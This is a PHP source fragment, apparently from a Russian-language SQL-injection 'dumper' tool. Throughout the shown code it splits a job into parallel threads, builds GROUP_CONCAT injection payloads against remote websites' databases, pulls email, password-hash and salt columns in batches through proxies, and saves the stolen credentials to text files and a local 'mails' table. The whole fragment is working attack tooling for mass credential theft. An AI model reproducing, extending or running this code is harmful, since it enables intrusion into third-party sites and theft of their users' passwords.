		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		
		$this->mysqlInj ->inject($squle[0]['posts']['header'].'::'.$squle[0]['posts']['gurl'],$squle[0],$set);
		
		
		/////выбираем возможную инфу о уже существующих потоках ЗАПУЩЕННЫХ или УЖЕ ЗАВЕРЕШННЫХ////
		$multi = $this->Post->query("SELECT count(*) FROM  `multis` WHERE `filed_id` = ".$mail['Filed']['id']." AND `get` !=0");
		
		
		////сколько должно дампится за один раз////
		$tmpCount = $count-$mail['Filed']['lastlimit'];
		$oneCount = $tmpCount/$settings['potok'];
		$oneCount = round($oneCount);
		
		//$shag = 10;//по сколько за раз будет дампится штук записей
		$shag=$this->shag;
		
		if($shag==''){$shag=5;}
		
		$zapr  = round($oneCount/$shag);//количество итераций
		if($zapr==0)$zapr=1;
		
		
		////логирование////
		$this->d($count,'$count');
		$this->d($mail['Filed']['lastlimit'],'$mail["Filed"]["lastlimit"]');
		$this->d($multi,"multi SELECT count(*) FROM  `multis` WHERE `filed_id` = ".$mail['Filed']['id']." AND `get` !=0");
		$this->d($zapr,'zapr pervuy KOLICHESTVO ITERACYU');
		$this->d($oneCount.' oneCount perviy S KAKOGO BUDEM NACHINAT $count-$mail["Filed"]["lastlimit"]/$settings["potok"]');
		
		
		flush();
		
		
		//////потоков нету, это первый////////
		if($multi[0][0]['count(*)'] == 0)
		{
			$this->d('//////////////////////////////////pervyi potok////////////////////////////////////////');
			///если меньше 5000 то больше к filed_id не обращается и дампим всё без деления на потоки////
			if($count < $this->potok_dump_one)
			{
				$oneCount = $count;
				
				$shag=$shag-10;
				$zapr  = round($oneCount/$shag);
				
				///логирование
				$this->d($zapr,'$zapr '.$this->potok_dump_one);
				$this->logs($zapr.' $zapr 5000:'.$this->r,__FUNCTION__);
				
				
				$this->Post->query("UPDATE  `fileds` SET  `get` =  '2', `multi` = 2 WHERE  `id` =".$filed_id);
			}
			
			$potok = 1;
			
			//по сути если нуль ff, значит потоки еще не начинались, иначе первый lastlimit1 = ff будет
			if($ff == 0)
			{
				$start = 0;
			}else
			{
				$start = $ff;
			}
			
			
			//если нету уже в базе данных, тогда вставляем инфу о потоке
			$numPotok = $this->Post->query("SELECT count(*) FROM  `multis` WHERE `potok` = ".$potok." AND `filed_id`=".$filed_id);
			
			$this->d($numPotok,'$numPotok vsego potokov');
			
			if($numPotok[0][0]['count(*)'] == 0)
			{
				
				//$this->d($squle,'squle $numPotok=0');
				
				$f = __FUNCTION__;
				$this->d('shag 1');
				
				$post_id = $squle[0]['posts']['id'];
				$squle[0]['posts']['url'] = str_replace('http://','',$squle[0]['posts']['url']);
				$squle[0]['posts']['url'] = 'http://'.$squle[0]['posts']['url'];
				$h2 = parse_url($squle[0]['posts']['url']);
				$domen = $h2['host'];
				//$date = date('Y-m-d h:i:s');
				$date = time();
				$tmpCount1 = $oneCount+$start;
				
				$this->d($post_id,'$post_id');
				
				$this->d($domen,'domen');
				
				$this->d($tmpCount1,'$tmpCount1');
				
				$this->d($date,'$date');
				
				$this->d($f,'$f');
				
				$this->d($potok,'$potok');
				
				$this->d($start,'$start');
				
				$this->d($filed_id,'$filed_id');
				
				$this->d('shag 2');
				
				$this->d("INSERT INTO `multis` (`filed_id`,`lastlimit`,`count`,`get`,`potok`,`isp`,`post_id`,`domen`,`date`,`pid`) VALUES({$filed_id},{$start},{$tmpCount1},1,{$potok},'{$f}',{$post_id},'{$domen}','{$date}',{$this->pid})");
				
				if($this->Post->query("INSERT INTO `multis` (`filed_id`,`lastlimit`,`count`,`get`,`potok`,`isp`,`post_id`,`domen`,`date`,`pid`) VALUES({$filed_id},{$start},{$tmpCount1},1,{$potok},'{$f}',{$post_id},'{$domen}','{$date}','{$this->pid}')")){
					
					
				}
				
				$this->Post->query("UPDATE  `starts` SET  `potok` = {$potok} WHERE  `time_start` =".$this->timeStart);
				$this->d('shag 3');
			}
		}else
		{//если уже есть потоки тогда вычисляет значения следующего
			
			$this->d('ETO UJE NE PERVUY POTOK');
			
			//////////////////////ставим статус 2, где было уже 3 попытки////////////////////////////////////
			$zav0 = $this->Post->query("SELECT * FROM  `multis` WHERE `get` = 3 AND `dok` = 1 AND `filed_id` =".$filed_id." limit 1");
			
			
			$this->d($zav0,'$zav0 multislivcontacat pass  `get` = 3 AND `dok` = 1');
			
			
			if($zav0[0]['multis']['get'] == 3)
			{
				$this->d('////////////////////////////////////////POPPITKI ISCHERPANU get = 3 AND dok = 1 V PIZDU//////////////////////////////////////////');
				if($this->Post->query("UPDATE  `multis` SET  `get` =  2 WHERE  `potok` = ".$zav0[0]['multis']['potok']." AND `filed_id`=".$filed_id))
				{
					$this->d('YES update `multis` SET  `get` =  2');
				}
				$this->d("UPDATE  `multis` SET  `get` =  2 WHERE  `potok` = ".$zav0[0]['multis']['potok']." AND `filed_id`=".$filed_id);
				$this->d($zav0,'zav0 ETO ESLI BILI UJE 3 POPITKI `GET` 3 AND `DOK`=1 ////// Stavim status 2');
				return 'vpizdu';
			}
			
			
			
			//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
			
			/////проверка на перезапуск, не больше двух попыток////
			$zav = $this->Post->query("SELECT * FROM  `multis` WHERE `get`=3 AND `dok` < 1 AND `filed_id`=".$filed_id." limit 1");
			
			//$this->d($zav,' $zav `get`=3 AND `dok` < 1');
			
			if($zav[0]['multis']['get'] == 3)
			{
				$this->d('////////////////////PEREZAPUSK//////////////////////////////////////////');
				$this->d($zav,'zav get=3 AND dok < 1 ////// dlya perezapuska');
				$dok = $zav[0]['multis']['dok']+1;
				$this->Post->query("UPDATE  `multis` SET  `get` =  1,`dok` =".$dok." WHERE  `potok` = ".$zav[0]['multis']['potok']." AND `filed_id`=".$filed_id);
				$this->Post->query("UPDATE  `starts` SET  `potok` = ".$zav[0]['multis']['potok']." WHERE  `time_start` =".$this->timeStart);
				
				$start =$zav[0]['multis']['lastlimit'];
				$oneCount =$zav[0]['multis']['count']; 
				$potok = $zav[0]['multis']['potok'];
				$shag = $shag-10;
				
				$oneCount = $oneCount -$start;
				$zapr  = round($oneCount/$shag);
				$this->d($zapr,'$zapr get 3 KOLICHESTO ITERACYU POSLE PERESAPUSKA');
				
				
			}else
			{

				/////система расчёта добавления нового потока/////
				
				$this->d('////////////////////DOBAVLYAEM NOVYU POTOK//////////////////////////////////////////');
				$allPotok = $multi[0][0]['count(*)'];
				
				
				
				
				//выбираем инфу о последнем потоке, даже если он завершен
				$next = $this->Post->query("SELECT * FROM  `multis` WHERE `potok` = ".$allPotok." AND `filed_id`=".$filed_id);
				
				//логи
				$this->d($allPotok,'$allPotok slivWithPassConcastMulti');
				$this->d($next,'$next - infa o poslednem potoke slivWithPassConcastMulti');
				
				
				$start = 	$next[0]['multis']['count'];
				$oneCount = $next[0]['multis']['count']+ $oneCount;
				$oneCount=$oneCount-20;
				
				$this->d($start,'$start');
				
				$this->d($count,'$count');
				
				$this->d($oneCount,'$oneCount');
				
				
				$potok =  	$next[0]['multis']['potok']+ 1;
				
				if($oneCount > $count)
				{
					/////логирование/////
					$this->d("$oneCount > $count oneCount > count  1");
					$oneCount = $count-100;
					$start = $start -100;
					
					if($potok >= 6 )
					{
						$potok = 6;
						$this->d('potok > 6 oneCount > count');
						
						
						//$this->d("UPDATE  `multis` SET  `get` = 2 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id,'$oneCount > $count');
						//if($this->Post->query("UPDATE  `multis` SET  `get` = 2 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id))
						//{
						//	$this->d('YES update');
						//}else{
						//$this->d('NE obnovilos');
						//}
						
						if($this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$allPotok." AND `filed_id`=".$filed_id)){
							
							$this->d("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$allPotok." AND `filed_id`=".$filed_id);
							$this->d('YES update potok > 6 oneCount > count slivpass contact prosto');
						}
						
						return 'vpizdu';
					}
				}
				
				
				
				
				
				////Если уже 6 штук есть потоков в таблице, то oneCount будет больше чем count, если не так то:
				if($oneCount < $count)
				{
					///если сумма потоков меньше или равно чем в настройках, то добавляем поток
					if($multi[0][0]['count(*)'] < $settings['potok'])
					{
						//если нету уже в базе данных, тогда вставляем инфу о потоке
						$numPotok = $this->Post->query("SELECT count(*) FROM  `multis` WHERE `potok` = ".$potok." AND `filed_id` =".$filed_id);
						
						$this->d("SELECT count(*) FROM  `multis` WHERE `potok` = ".$potok." AND `filed_id` =".$filed_id,'EST UJE POTOK TAKOY!!!');
						
						
						if($numPotok[0][0]['count(*)'] == 0)
						{
							$f = __FUNCTION__;
							
							$post_id = $squle[0]['posts']['id'];
							$squle[0]['posts']['url'] = str_replace('http://','',$squle[0]['posts']['url']);
							$squle[0]['posts']['url'] = 'http://'.$squle[0]['posts']['url'];
							$h2 = parse_url($squle[0]['posts']['url']);
							$domen = $h2['host'];
							//$date = date('Y-m-d h:i:s');
							$date = time();
							if($this->Post->query("INSERT INTO multis (`filed_id`,`lastlimit`,`count`,`get`,`potok`,`isp`,`post_id`,`domen`,`date`,`pid`) VALUES({$filed_id},{$start},{$oneCount},1,{$potok},'{$f}',{$post_id},'{$domen}','{$date}',{$this->pid})"))
							{
								$this->d($potok.' $potok YES insert zapis');
								$this->logs($potok.' - potok; YES insert zapis:'.$this->r,__FUNCTION__);
							}else
							{
								$this->d($potok.' $potok NO!!!! insert zapis');
								$this->logs($potok.' - potok;NO!!! insert zapis:'.$this->r,__FUNCTION__);
							}
							
							$this->Post->query("UPDATE  `starts` SET  `potok` = {$potok} WHERE  `time_start` =".$this->timeStart);
						}else{
							$this->d('POTOK UJE EST v multis status get=3 stavim slivWithPassConcastMulti');
							$this->logs('POTOK UJE EST v multis status get=3 stavim slivWithPassConcastMulti'.$this->r,__FUNCTION__);
							$this->d("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
							$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
							return 'vpizdu';
							
						}
					}else
					{
						$this->d('$multis[0][0][count(*)] <= $settings[potok]');
						$this->logs('$multis[0][0][count(*)] <= $settings[potok]:'.$this->r,__FUNCTION__);
						if($potok >6 )
						{
							$potok = 6;
							$this->d('potok > 6');
						}
						$this->d("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
						$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
						return 'vpizdu';
						
					}
				}
			}
			
			
		}
		
		
		
		//exit;
		////Подготовка
		$squle[0]['posts']['url'] = str_replace('http://','',$squle[0]['posts']['url']);
		$squle[0]['posts']['url'] = 'http://'.$squle[0]['posts']['url'];
		
		$url = parse_url($squle[0]['posts']['url']);				
		$zone = explode('.', $url['host']);
		$zone = $zone[count($zone)-1];
		
		if($this->sliv_pass_save==true){
			
			if($this->salt == true){
				$filename = "./slivpass_save_solt/".$url['host'].'_'.$mail['Filed']['table'].".txt";				
				$fh = fopen($filename, "a+");
			}else{
				$filename = "./slivpass_save/".$url['host'].'_'.$mail['Filed']['table'].".txt";				
				$fh = fopen($filename, "a+");
			}
			
			
			
			
			fwrite($fh, $squle[0]['posts']['url']."\n");
			
		}
		
		
		
		$time=time();
		
		///Для расчёта дублей, пустых и хешей
		$this->l2 = 0;
		$this->tmp2 = array();
		$this->k = 0;
		$this->l5 = 0;
		$this->tmp5 = array();
		$this->emp=0;
		$this->email_gavno = 0;
		$this->emp_pass = 0;
		
		
		///логирование
		$this->logs($zapr.'-zapr poslednyu:'.$this->r,__FUNCTION__);
		$this->logs($oneCount.'-oneCount:'.$this->r,__FUNCTION__);
		$this->logs($count.'-count:'.$this->r,__FUNCTION__);
		$this->logs($start.'-start:'.$this->r,__FUNCTION__);
		$this->logs($potok.'-potok:'.$this->r,__FUNCTION__);
		
		$this->d($zapr.'-zapr poslednyu:'.$this->r);
		$this->d($oneCount.'-oneCount:'.$this->r);
		$this->d($count.'-count:'.$this->r);
		$this->d($start.'-start:'.$this->r);
		$this->d($potok.'-potok:'.$this->r);
		$this->d($this->pid.'-pid:'.$this->r);
		
        
        
        
		flush();
		
		//exit;
		
		for ($i=0;$i<$zapr;$i++)
		{
			echo $i.'-i<br>';
			
			$this->workup();
			
			$new = time();
			$razn = $new-$time;
			$this->d($razn,'razn');
			
			if($razn>$this->raznica_dump)
			{
				$this->d($razn.'-razn slivWithPassConcastMulti po vremeni > 25:'.$this->r);
				$this->logs($razn.'-razn po vremeni:'.$this->r,__FUNCTION__);
				$this->Post->query("UPDATE  `multis` SET  `get` = 3  WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
				$this->Post->query("UPDATE  `multis` SET  `prich` = 'razn slivWithPassConcastMulti po vremeni'  WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
				
				//$this->stop();
				//$pid  = getmypid();
				//exec("kill -9 ".$pid);
				return 'vpizdu';
			}
			
			$time = time();
			
			$this->workup();
			$pass=explode(':', $mail['Filed']['password']);
			$pass = $pass[1];
			
			
			if($mail['Filed']['name'] !=''){
				
				$name = $mail['Filed']['name'];
			}
			
			$this->Post->query("UPDATE  `multis` SET  `lastlimit` = $start,`date`= $time,`pid`={$this->pid} WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
			
			
			
			$salt=explode(':', $mail['Filed']['salt']);
			$salt = $salt[1];
			
			
			if($this->salt == true){
				
				
				
				$mysql = $this->mysqlInj->mysqlGetValue('', '(SELECT+'.$mail['Filed']['label'].','.$pass.','.$salt.' FROM '.$bd[1].'.`'.$mail['Filed']['table'].'` WHERE `'.$mail['Filed']['label'].'` LIKE char('.$this->charcher('%@%').') LIMIT '.$start.','.$shag.')t ', 'GROUP_CONCAT(t.'.$mail['Filed']['label'].',char('.$this->charcher(':').'),t.'.$pass.',char('.$this->charcher(':').'),t.'.$salt.')',0,array());
				
			}else{
				$mysql = $this->mysqlInj->mysqlGetValue('', '(SELECT+'.$mail['Filed']['label'].','.$pass.' FROM '.$bd[1].'.`'.$mail['Filed']['table'].'` WHERE `'.$mail['Filed']['label'].'` LIKE char('.$this->charcher('%@%').') LIMIT '.$start.','.$shag.')t ', 'GROUP_CONCAT(t.'.$mail['Filed']['label'].',char('.$this->charcher(':').'),t.'.$pass.')',0,array());
				
			}
			
			
			
			
			
			$start2 = $start;
			
			$start = $start + $shag;
			
			$this->d($mysql,'$mysql');
			
			
			
			if($this->salt == true)
			{
				if($i==0 AND !isset($mysql['GROUP_CONCAT(t.'.$mail['Filed']['label'].',char('.$this->charcher(':').'),t.'.$pass.',char('.$this->charcher(':').'),t.'.$salt.')']))
				{
					$shag_new = $shag-10;
					$mysql = $this->mysqlInj->mysqlGetValue('', '(SELECT+'.$mail['Filed']['label'].','.$pass.','.$salt.' FROM '.$bd[1].'.`'.$mail['Filed']['table'].'` WHERE `'.$mail['Filed']['label'].'` LIKE char('.$this->charcher('%@%').') LIMIT '.$start.','.$shag_new.')t ', 'GROUP_CONCAT(t.'.$mail['Filed']['label'].',char('.$this->charcher(':').'),t.'.$pass.',char('.$this->charcher(':').'),t.'.$salt.')',0,array());
					
					$this->d($mysql_new,'$mysql_new');
					
					if(isset($mysql_new['GROUP_CONCAT(t.'.$mail['Filed']['label'].',char('.$this->charcher(':').'),t.'.$pass.',char('.$this->charcher(':').'),t.'.$salt.')']))
					{
						
						$this->d('shag nado menshe');
						$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
						$this->Post->query("UPDATE  `multis` SET  `prich` = 'UMENSHEN SHAG - minus 10'  WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
						return 'vpizdu';
					}
				
				}	
				
			}else{
				
				
				if($i==0 AND !isset($mysql['GROUP_CONCAT(t.'.$mail['Filed']['label'].',char('.$this->charcher(':').'),t.'.$pass.')']))
				{
					$shag_new = $shag-10;
					$mysql_new = $this->mysqlInj->mysqlGetValue('', '(SELECT+'.$mail['Filed']['label'].','.$pass.' FROM '.$bd[1].'.`'.$mail['Filed']['table'].'` WHERE `'.$mail['Filed']['label'].'` LIKE char('.$this->charcher('%@%').') LIMIT '.$start.','.$shag_new.')t ', 'GROUP_CONCAT(t.'.$mail['Filed']['label'].',char('.$this->charcher(':').'),t.'.$pass.')',0,array());
					
					$this->d($mysql_new,'$mysql_new');
					
					if(isset($mysql_new['GROUP_CONCAT(t.'.$mail['Filed']['label'].',char('.$this->charcher(':').'),t.'.$pass.')']))
					{
						
						$this->d('shag nado menshe');
						$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
						$this->Post->query("UPDATE  `multis` SET  `prich` = 'UMENSHEN SHAG - minus 10'  WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
						return 'vpizdu';
					}
				
				}	
				
			}
			//echo 123;
			
			//exit;
			////////////
			
			
			/////////////
			
			if($this->salt == true)
			{
				if($i==0 AND !isset($mysql['GROUP_CONCAT(t.'.$mail['Filed']['label'].',char('.$this->charcher(':').'),t.'.$pass.',char('.$this->charcher(':').'),t.'.$salt.')']))
				{
					if($this->sliv_pass_save==true){
						fclose($fh);
					}
					$this->Post->query("UPDATE  `multis` SET  `function` = 1 WHERE  `potok` =$potok AND `filed_id` =".$filed_id);
					$this->logs('function = 1:'.$this->r,__FUNCTION__);
					if ($this->slivWithPassMulti($id,$potok,$start2,$oneCount) == 'vpizdu')
					{
						$this->Post->query("UPDATE  `multis` SET  `prich` = 'function = Multi SOLT vpizdu '  WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
						
						return 'vpizdu';
					}
					
					return;
					
				}
				
			}else{
				

				if($i==0 AND !isset($mysql['GROUP_CONCAT(t.'.$mail['Filed']['label'].',char('.$this->charcher(':').'),t.'.$pass.')']))
				{
					if($this->sliv_pass_save==true){
						fclose($fh);
					}
					$this->Post->query("UPDATE  `multis` SET  `function` = 1 WHERE  `potok` =$potok AND `filed_id` =".$filed_id);
					$this->logs('function = 1:'.$this->r,__FUNCTION__);
					if ($this->slivWithPassMulti($id,$potok,$start2,$oneCount) == 'vpizdu')
					{
						$this->Post->query("UPDATE  `multis` SET  `prich` = 'function = Multi vizdu'  WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
						
						return 'vpizdu';
					}
					
					return;
					
				}
			}
			
			
			
			
			if($mysql['GROUP_CONCAT(t.'.$mail['Filed']['label'].',char('.$this->charcher(':').'),t.'.$pass.')']!=='' OR $mysql['GROUP_CONCAT(t.'.$mail['Filed']['label'].',char('.$this->charcher(':').'),t.'.$pass.',char('.$this->charcher(':').'),t.'.$salt.')'] !=='')
			{

		
				if($this->salt == true)
				{
					$mails = explode(',', $mysql['GROUP_CONCAT(t.'.$mail['Filed']['label'].',char('.$this->charcher(':').'),t.'.$pass.',char('.$this->charcher(':').'),t.'.$salt.')']);
				}else{
					
					$mails = explode(',', $mysql['GROUP_CONCAT(t.'.$mail['Filed']['label'].',char('.$this->charcher(':').'),t.'.$pass.')']);
				}	
		
		
				
				
				$null = 0;	
				$l =0;
				
				
				$tmp = array();
				$tmp3 = array();
				
				foreach ($mails as $value)
				{
					
					echo '||'.$value.'||<br/>';
					
					if($this->sliv_pass_save==true){
						fwrite($fh, trim($value)."\n");
					}
					
				
					
					$p = explode(':',$value);
					
					if(!isset($p[1]))
					{
						$pass = '';
					}else{
						$pass = trim($p[1]);
						
					}
					
					if(!isset($p[2]))
					{
						$salt_new = '';
					}else{
						$salt_new = trim($p[2]);
						
					}
					
					
					
					
					if(strpos($p[1],'mysql_fetch_array()'))
					{
						$this->Post->query("UPDATE  `multis` SET  `prich` = 'mysql_fetch_array'  WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
						$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
						$this->d("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
						$this->d("mysql_fetch_array() UHODIM");
						return 'vpizdu';
					}
					
					if($pass == '')
					{
						$this->emp_pass++;
					}
					
					
					if($this->emp_pass > $this->pass_empty and $this->up == false)
					{
						$this->logs('$this->emp_pass > N:'.$this->r,__FUNCTION__);
						$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
						
						$this->Post->query("UPDATE  `multis` SET  `prich` = 'emp_pass > $this->pass_empty  pass pustie'  WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
						
						return 'vpizdu';
					}
					
					
					
					
					@$key0 = array_search($pass, $this->stopword);

					
					if($key0 === FALSE AND strlen($pass) > 2 AND $p[0] !='null')
					{

						$ht = $this->hashtype($pass);
						
						if($ht != 1)
						{
							$this->hashtype = $ht;
						}else{
							$this->hashtype = '0';
						}

						preg_match('/\\A(?:^([a-z0-9][a-z0-9_\\-\\.\\+]*)@([a-z0-9][a-z0-9\\.\\-]{0,63}\\.([a-z]{2,4}))$)\\z/i',$p[0],$z);
						
						if($z[0] !='')//если строка мыло нормальное
						{
							
							$m = explode('@',$z[0]);
							
							@$key = array_search($pass, $tmp);
							//смотрит последний элемент массива не такой же он, чтобы найти короткие хеши 
							@$key2 = array_search(strlen($pass), array_slice($this->tmp2, count($this->tmp2)-1));
							
							//сравниваем мыла
							@$key5 = array_search(strlen($z[0]), array_slice($this->tmp5, count($this->tmp5)-1));
							
							
							//чтобы не было дубликатов
							@$key3 = array_search($p[0], $tmp3);
							
							//логи
							//$this->d(array_slice($this->tmp2, count($this->tmp2)-1),'slice');
							//$this->d(strlen($pass),'strlen');
							//$this->d($key2,'key');
							//flush();
							
							$tmp[]  = $pass;
							$tmp3[] = $p[0];
							
							$this->tmp2[] = strlen($pass);
							
							$this->tmp5[] = strlen($z[0]);
							
							
							if($this->hashtype == '0')
							{
								//$this->d($this->hashtype,'hash');
								
								
								//проверяем какой нить маленьких хэш по количеству символов
								if($key2 !== FALSE AND $this->k < 6)
								{
									$this->l2++;
									//$this->d($this->l2,'буква L2');
									if($this->l2 > 7)
									{
										$this->hashtype = 'unkown';
									}
									
								}else{
									$this->k++;
								}
							}
							
							//проверка чтобы мыла не были одной длины слишком часто
							if($key5 !== FALSE )
							{
								$this->l5++;
								//$this->d($this->l5,'l5');
								
								
								if($this->l5 > $this->dlina and $this->up == false)
								{
									$this->logs('$this->l5 > 75:'.$this->r,__FUNCTION__);
									$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
									
									$this->Post->query("UPDATE  `multis` SET  `prich` = 'this->l5 > $this->dlina odonakovie po dline'  WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
									
									return 'vpizdu';
								}
									
								
								
							}else{
								$this->l5--;
							}
							
							
								if($this->salt == true)
								{
										$pass = $pass.':'.$salt_new;
										$this->Post->query("INSERT INTO mails (`email`,`pass`,`date`,`domen`,`hashtype`,`bd`,`zona`,`meiler`) VALUES('{$p[0]}','{$pass}',now(),'{$url[host]}','{$this->hashtype}','{$bd[1]}','{$zone}','{$m[1]}')");
								}else{
									$this->Post->query("INSERT INTO mails (`email`,`pass`,`date`,`domen`,`hashtype`,`bd`,`zona`,`meiler`) VALUES('{$p[0]}','{$pass}',now(),'{$url[host]}','{$this->hashtype}','{$bd[1]}','{$zone}','{$m[1]}')");
									
								}	
								
								
								
								echo 'OK<br>';
								
								
							
						}else
						{
							$this->email_gavno++;

							
							if($this->email_gavno == $this->email_bad  and $this->up == false)
							{
								echo 'Mnogo email_gavno $this->email_bad';
								$this->logs('Mnogo email_gavno:'.$this->r,__FUNCTION__);
								$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);
								$this->Post->query("UPDATE  `multis` SET  `prich` = 'Mnogo email_gavno $this->email_bad'  WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);
								
								return 'vpizdu';
							}

							
						}	
					}
					else
					{
						$this->null++;
						$this->d($this->null,'count NULL TRIM');
						
						
						if($this->null == $this->null_count)
						{
							$this->d( 'Много пустных или null '.$this->null);
							$this->logs('Mnogo null:'.$this->null.' '.$this->r,__FUNCTION__);
							$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
							$this->Post->query("UPDATE  `multis` SET  `prich` = 'Mnogo null $this->null_count'  WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
							
							$this->d("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
							
							return 'vpizdu';
						}
							
						
					}	
					flush();
				}
			}else
			{
				$this->emp++;
				if($this->emp == $this->hunta)
				{
					$this->d($this->emp ,'$this->emp = 55vpizdu');
					$this->logs($this->emp.' $this->emp = 55vpizdu:'.$this->r,__FUNCTION__);
					$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
					$this->Post->query("UPDATE  `multis` SET  `prich`='this->hunta $this->hunta = vpizdu vashe pusto'  WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);
					
					return "vpizdu";
					
				}
			}					
		}
		
		$this->Post->query("UPDATE  `multis` SET  `get` = 2 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
		if($this->sliv_pass_save==true){
			fclose($fh);
		}
		//$this->renamename($filename);
		
		return ;
		
	}

	function slivWithPassMulti($id=2,$potok = 1,$lastlimit = 0,$oneCount=0){//слив паролей через лимит --MYSQL--
		
        
        if(!isset($this->raznica_dump) or $this->raznica_dump=='')$this->raznica_dump=60;
        
		$settings['potok_one']  = $this->potok_one;
		$settings['dump_one_good'] = $this->dump_one_good;
		$settings['dump_one'] = $this->dump_one;
		$settings['check_url'] = $this->check_url;
		$settings['potok'] = $this->potok;
		$settings['pass']= $this->pass;
		
		$this->d('slivWithPassMulti activ!');
		$hunta = 1;
		
		$mail = $this->Filed->findbyid($id);
		
		$filed_id = $mail['Filed']['id'];
		
		$squle = $this->Post->query("SELECT * FROM  `posts` WHERE `id` = ".$mail['Filed']['post_id']." limit 0,1");
		
		if(strlen($squle[0]['posts']['sleep']) > 2)
		{
			$set = $squle[0]['posts']['sleep'];
			$this->d($set,'pass SET dump odin');
		}else
		{
			$set = false;
		}
		
		
		//инициируем первоначальные параметры
		$this->mysqlInj = new $this->Injector();
		
		$this->proxyCheck();

		$this->mysqlInj ->inject($squle[0]['posts']['header'].'::'.$squle[0]['posts']['gurl'],$squle[0],$set);
		
		
		/////общие данные из выборки//////
		$bd = explode(':', $mail['Filed']['ipbase']);//все бд
		$count = $mail['Filed']['count'];
		
		$squle[0]['posts']['url'] = str_replace('http://','',$squle[0]['posts']['url']);
		$squle[0]['posts']['url'] = 'http://'.$squle[0]['posts']['url'];
		
		$url = parse_url($squle[0]['posts']['url']);				
		$zone = explode('.', $url['host']);
		$zone = $zone[count($zone)-1];
		
		if($this->sliv_pass_save==true){
			
			if($this->salt == true)
			{
				$filename = "./slivpass_save_solt/".$url['host'].'_'.$mail['Filed']['table'].".txt";				
				$fh = fopen($filename, "a+");
			}else{
				
				$filename = "./slivpass_save/".$url['host'].'_'.$mail['Filed']['table'].".txt";				
				$fh = fopen($filename, "a+");
			}
			
			
			fwrite($fh, $squle[0]['posts']['url']."\n");
			
		}
		
		
		
		
		$pass_f2 = explode(':', $mail['Filed']['password']);
		$pass_f = $pass_f2[1];
		
		
		$salt2 = explode(':', $mail['Filed']['salt']);
		$salt_new = $salt2[1];
		
		
		$time = time();
		
		
		///для хешей, дублей, и нулов//////
		$null = 0;
		$l=0;
		$tmp = array();
		$tmp3 = array();
		$this->l2 = 0;
		$this->tmp2 = array();
		$this->k = 0;
		$this->l5 = 0;
		$this->tmp5 = array();
		$this->emp_pass = 0;
		
		///логирование
		$this->logs($url['host'].' '.$lastlimit.'-function lastlimit:'.$this->r,__FUNCTION__);
		$this->logs($url['host'].' '.$oneCount.'-function oneCount:'.$this->r,__FUNCTION__);
		$this->logs($url['host'].' '.$potok.'-function potok:'.$this->r,__FUNCTION__);
		$this->logs($url['host'].' '.ceil($lastlimit+$oneCount).'-function lastlimit+$oneCount:'.$this->r,__FUNCTION__);
		
		for ($i=$lastlimit;$i<ceil($lastlimit+$oneCount);$i++)
		{

			////определение зависания потока
			$this->workup();
			$new = time();
			$razn = $new-$time;

            
            
            
			if($razn>$this->raznica_dump)
			{
				$this->d($razn.'-razn slivMultiOnePass > 25:'.$this->r);
				$this->logs($razn.'-razn slivMultiOnePass > 25:'.$this->r);
				$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
				
				$this->Post->query("UPDATE  `multis` SET  `prich`='function razn slivMultiOnePass > 25'  WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
				
				return 'vpizdu';
			}
			
			$time = time();

			$this->Post->query("UPDATE  `multis` SET  `lastlimit` = $lastlimit,`date`= $time,`pid`={$this->pid} WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
			
			
			if($this->salt == true)
			{
				$mysql = $this->mysqlInj->mysqlGetValue($bd[1],$mail['Filed']['table'], array($mail['Filed']['label'],$pass_f,$salt_new), $i,array(),' WHERE `'.$mail['Filed']['label'].'` LIKE char('.$this->charcher('%@%').')');
			
			}else{
				
				$mysql = $this->mysqlInj->mysqlGetValue($bd[1],$mail['Filed']['table'], array($mail['Filed']['label'],$pass_f), $i,array(),' WHERE `'.$mail['Filed']['label'].'` LIKE char('.$this->charcher('%@%').')');
			}	
			
